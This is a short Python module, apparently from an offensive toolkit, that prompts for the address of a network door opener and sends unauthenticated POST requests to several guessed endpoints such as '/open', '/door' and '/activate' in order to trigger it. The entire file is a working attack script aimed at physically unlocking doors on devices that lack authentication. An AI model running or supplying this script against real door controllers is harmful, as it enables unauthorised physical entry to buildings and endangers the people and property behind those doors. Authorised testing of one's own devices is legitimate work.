import requests
def runModule():
	print("This module sends POST requests to door openers with no authentication.")
	url = input("URL of door? ")
	urls = [url + "/action", url + "/open", url + "/door", url + "/activate", url]
	for u in urls:
		try:
			requests.post(u)
		except:
			print("POST to " + u + " failed...")
